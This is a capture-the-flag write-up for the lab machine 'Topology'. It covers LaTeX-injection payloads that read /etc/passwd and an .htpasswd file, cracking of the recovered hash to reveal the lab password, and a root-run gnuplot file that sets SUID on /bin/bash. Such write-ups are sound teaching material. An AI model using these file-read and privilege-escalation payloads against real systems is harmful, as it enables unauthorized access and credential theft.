# Topology

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.76.27 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 23:49 +08
Nmap scan report for 10.129.76.27
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

HTTP exploits it seems.&#x20;

### LaTeX Project --> LFI

The website is seems to be a university website:

<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

There's a LaTeX Equation Generator available. LaTeX is a software made for documentation, and I'm roughly familiar with how it works to make mathematical equations for stuff like university math module notes. Anyways, we have to add `latex.topology.htb` to our `/etc/hosts` file to visit the `equation.php` site available.&#x20;

On the site itself, it just shows some basic LaTeX syntax:

<figure><img src="../../../.gitbook/assets/image (3253).png" alt=""><figcaption></figcaption></figure>

There are some exploits available pertaining to Latex Injection, such as being able to read machine files. I tried to use `\input{/etc/passwd}` to read files, but there's a WAF blocking it:

<figure><img src="../../../.gitbook/assets/image (2156).png" alt=""><figcaption></figcaption></figure>

I tested different payloads, and eventually found one that worked on this site:

{% embed url="https://0day.work/hacking-with-latex/" %}

```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

Using this, we can get the first line of the `/etc/passwd` file:

<figure><img src="../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Before carrying on, I wanted to some proper web enumeration to find out what I was supposed to do with this LFI. Using `wfuzz`, I found a `dev` subdomain:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.topology.htb" --hc=200 -u http://topology.htb
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://topology.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000019:   401        14 L     54 W       463 Ch      "dev"
```

This returns a 401, and visiting it requires credentials:

<figure><img src="../../../.gitbook/assets/image (2140).png" alt=""><figcaption></figcaption></figure>

This is a HTTP sign in, meaning we can probably find the credentials in a `.htpasswd` file somewhere. Also, it coincides with the one-line LFI that we have. However, the same command does not work with the `/var/www/dev/.htpasswd` file, which is definitely where the password hash is stored.

In this case, what we can do is try to use other commands, like `\lstinputlisting`. However, this payload doesn't work:

```latex
\lstinputlisting{/var/www/dev/.htpasswd}
```

It doesn't work (as I've learnt) because the machine asks for **LaTeX inline math mode.** There are different modes for LaTeX present, and they would parse characters differently. If we use '$' signs, we can force the machine to process our query by switching mode for it.&#x20;

{% embed url="https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and" %}

If we use `\\lstinputlisting{/var/www/dev/.htpasswd}` instead, we see that it processes it as text:

<figure><img src="../../../.gitbook/assets/image (2429).png" alt=""><figcaption></figcaption></figure>

So by using `$\lstinputlisting{/var/www/dev/.htpasswd}$`, it would be processed as an expression (similar to `$()` in bash) and loads the hash:

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

We can crack the hash easily with `john`:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (vdaisley)     
1g 0:00:00:04 DONE (2023-06-12 00:30) 0.2375g/s 236511p/s 236511c/s 236511C/s calebd1..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then we can access the `dev` subdomain:

<figure><img src="../../../.gitbook/assets/image (1322).png" alt=""><figcaption></figcaption></figure>

More importantly, we can access the user via `ssh`:

<figure><img src="../../../.gitbook/assets/image (3362).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### GNUPlot

Within the `/opt` directory, there was a `gnuplot` file present:

```
vdaisley@topology:/opt$ ls
gnuplot
vdaisley@topology:/opt$ ls -al
total 12
drwxr-xr-x  3 root root 4096 May 19 13:04 .
drwxr-xr-x 18 root root 4096 May 19 13:04 ..
drwx-wx-wx  2 root root 4096 Jun  6 08:14 gnuplot
```

I also ran a `pspy64` while searching more about this particular software, and found some interesting processes:

```
2023/06/11 12:35:01 CMD: UID=0    PID=2774   | /usr/sbin/CRON -f 
2023/06/11 12:35:01 CMD: UID=0    PID=2773   | /usr/sbin/CRON -f 
2023/06/11 12:35:01 CMD: UID=0    PID=2776   | /bin/sh /opt/gnuplot/getdata.sh 
2023/06/11 12:35:01 CMD: UID=0    PID=2775   | /bin/sh -c /opt/gnuplot/getdata.sh 
2023/06/11 12:35:01 CMD: UID=0    PID=2781   | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;                                                                           
2023/06/11 12:35:01 CMD: UID=0    PID=2787   | gnuplot /opt/gnuplot/loadplot.plt 
2023/06/11 12:35:01 CMD: UID=0    PID=2786   | sed s/,//g 
2023/06/11 12:35:01 CMD: UID=0    PID=2785   | 
2023/06/11 12:35:01 CMD: UID=0    PID=2782   | find /opt/gnuplot -name *.plt -exec gnuplot {} ;                                                                                           
2023/06/11 12:35:01 CMD: UID=0    PID=2788   | gnuplot /opt/gnuplot/networkplot.plt 
```

We don't have read access to the directory, but we have write access, meaning we have to manipulate the `.plt` files present on the `/opt` directory to somehow achieve RCE as `root`. Or, we can just add another `.plt` file.&#x20;

I found a resource that shows the `system` keyword can be used to execute system commands:

{% embed url="http://www.bersch.net/gnuplot-doc/system.html" %}

We just need to create a `priv.plt` file within the directory:

```
system "chmod u+s /bin/bash"
```

Then, we can just wait for `root` to execute our new file and privesc that way:

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
